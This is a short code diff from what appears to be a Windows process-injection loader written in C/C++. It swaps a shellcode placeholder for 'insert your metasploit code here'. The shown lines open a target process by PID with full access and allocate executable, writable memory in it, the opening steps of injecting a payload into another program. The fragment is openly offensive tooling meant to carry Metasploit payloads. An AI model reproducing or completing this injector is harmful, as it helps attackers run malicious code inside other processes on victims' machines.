@@ -4,7 +4,7 @@
 int main(int argc, char* argv[])
 {
 	unsigned char shellcode[] =
-		"insert shellcode here";
+		"insert your metasploit code here ";
 
 	HANDLE Process_Handle = OpenProcess(PROCESS_ALL_ACCESS, 0, DWORD(atoi(argv[1])));
 	PVOID Alloc = VirtualAllocEx(Process_Handle, NULL, sizeof shellcode, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
